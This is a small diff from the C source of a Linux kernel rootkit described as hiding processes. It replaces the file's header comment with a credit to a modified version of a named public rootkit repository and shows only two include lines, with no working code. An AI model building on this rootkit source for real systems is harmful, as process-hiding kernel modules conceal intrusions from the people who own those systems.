@@ -1,8 +1,4 @@
-/*
- * Experimental RootKit
- * Simple RootKit for the EARL project
- * Functionality : Hiding processes
- */
+/* NO LONGER ORIGINAL,  THIS IS A MODIFIED VERSION OF NISAY759'S ROOTKIT GET THE ORIGINAL FROM HERE nisay759/linux-rootkits  */
 
 #include <linux/init.h>
 #include <linux/kernel.h>
